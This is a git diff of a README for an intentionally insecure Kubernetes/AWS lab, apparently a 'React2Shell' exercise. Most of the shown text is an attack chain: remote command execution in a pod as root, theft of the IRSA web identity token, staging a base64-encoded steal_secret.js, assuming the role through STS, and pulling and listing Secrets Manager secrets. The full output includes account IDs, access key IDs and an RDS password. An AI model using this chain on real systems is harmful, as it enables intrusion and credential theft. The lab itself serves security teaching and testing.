@@ -106,6 +106,8 @@ kubectl get applications -n argocd
 kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 --decode; echo
 # port forward
 kubectl port-forward service/argocd-server -n argocd 8443:443
+
+kubectl apply -f argocd/root-app-insecure.yaml
 ```
 
 ---
@@ -139,45 +141,49 @@ React2Shell RCE in pod
 
 ## Commands
 
-- App port-forwarded at `localhost:3000`. Exploit via `scripts/rce.py`.
+- App port-forwarded at `react2shell-insecure.arguswatcher.net:3000`. Exploit via `scripts/rce.py`.
 - Precondition: the pod must be restarted after the IRSA annotation so the
   projected AWS token is injected.
 
 ```sh
 # restart the pod to pick up the IRSA token
 kubectl rollout restart deploy/react2shell -n insecure-frontend
+
+# forward
+kubectl port-forward service/react2shell -n insecure-frontend 3000:3000
+
+vi /etc/hosts
 ```
 
 ```sh
 # 1. confirm RCE
-python scripts/rce.py http://localhost:3000 "id"
-# executable response:
+python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "id"
 # uid=0(root) gid=0(root) groups=0(root)
 
 # 2. detect IRSA — pod has an AWS identity
-python scripts/rce.py http://localhost:3000 "env | grep AWS"
+python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "env | grep AWS"
 # AWS_ROLE_ARN=arn:aws:iam::099139718958:role/react2shell-eks-dev-pod-irsa
 # AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
 # AWS_STS_REGIONAL_ENDPOINTS=regional
 # AWS_DEFAULT_REGION=ca-central-1
 # AWS_REGION=ca-central-1
 
-python scripts/rce.py http://localhost:3000 "cat \$AWS_WEB_IDENTITY_TOKEN_FILE"
+# get web id
+python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "cat \$AWS_WEB_IDENTITY_TOKEN_FILE"
 executable response:
 # eyJhbGciOiJSUzI1NiIsImtpZCI6IjFhN2U2ZDBiZGY4ODBhNjQ0NGNjYmNlYjZiYWYzNDY4MDA1NDhkOGYiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXh...
 
 # 3. no aws CLI in the image — the SDK path is unavailable
-python3 scripts/rce.py http://localhost:3000 "aws sts get-caller-identity"
+python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "aws sts get-caller-identity"
 # /bin/sh: 1: aws: not found
 
 # 4. grab the crown jewel with Node built-ins only (no aws CLI/SDK).
 #    steal_secret.js: read IRSA token -> STS AssumeRoleWithWebIdentity
 #    -> Secrets Manager GetSecretValue (hand-rolled SigV4).
 b64=$(base64 -w0 scripts/steal_secret.js)
-python3 scripts/rce.py http://localhost:3000 "echo $b64 | base64 -d > /tmp/s.js"
+python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "echo $b64 | base64 -d > /tmp/s.js"
 
-python3 scripts/rce.py http://localhost:3000 "node /tmp/s.js react2shell-eks-dev-rds-credential"
-# executable response:
+python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /tmp/s.js react2shell-eks-dev-rds-credential"
 # [*] role=arn:aws:iam::099139718958:role/react2shell-eks-dev-pod-irsa region=ca-central-1 secret=react2shell-eks-dev-rds-credential
 # [*] assumed role, akid=ASIAROFJQB4XPM3B6R34
 # {"ARN":"arn:aws:secretsmanager:ca-central-1:099139718958:secret:react2shell-eks-dev-rds-credential-b5EgkD","CreatedDate":1.791514081673E9,"Name":"react2shell-eks-dev-rds-credential","SecretString":"{\"dbname\":\"appdb\",\"engine\":\"postgres\",\"host\":\"placeholder.rds.amazonaws.com\",\"password\":\"RDS-sECrEt-InsECurE\",\"port\":5432,\"username\":\"rds_admin\"}","VersionId":"terraform-bDQySnBEJwOZmMCUBC0fhbqOjv","VersionStages":["AWSCURRENT"]}
@@ -185,16 +191,9 @@ python3 scripts/rce.py http://localhost:3000 "node /tmp/s.js react2shell-eks-dev
 
 # 5. blast radius — the */* role lists secrets, not just its own
 #    (re-stage /tmp/s.js first if steal_secret.js changed)
-python3 scripts/rce.py http://localhost:3000 "node /tmp/s.js --list"
+python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /tmp/s.js --list"
 # executable response:
 # [*] role=arn:aws:iam::099139718958:role/react2shell-eks-dev-pod-irsa region=ca-central-1 mode=list
 # [*] assumed role, akid=ASIAROFJQB4XIGNCE43C
 # {"SecretList":[{"ARN":"arn:aws:secretsmanager:ca-central-1:099139718958:secret:react2shell-eks-dev-rds-credential-b5EgkD","CreatedDate":1.791514081357E9,"Description":"RDS master credential (crown jewel for the lab).","LastAccessedDate":1.791504E9,"LastChangedDate":1.791514081676E9,"Name":"react2shell-eks-dev-rds-credential","SecretVersionsToStages":{"terraform-bDQySnBEJwOZmMCUBC0fhbqOjv":["AWSCURRENT"]},"Tags":[{"Key":"Project","Value":"react2shell-eks"},{"Key":"Environment","Value":"dev"},{"Key":"ManagedBy","Value":"terraform"}]}]}
 ```
-
-- **Why Node, not `aws`:** the insecure image ships Node (`next dev`) but no
-  `aws` CLI. An attacker uses what is on the box — the AWS APIs are plain HTTPS,
-  so built-in `https` + `crypto` (SigV4) are enough.
-- **Blast radius:** the role is `Action:* Resource:*`, so the same assumed
-  credentials reach far beyond this one secret (list/read any secret, STS, etc).
-  `steal_secret.js` demonstrates one read; extend it to prove wider reach.
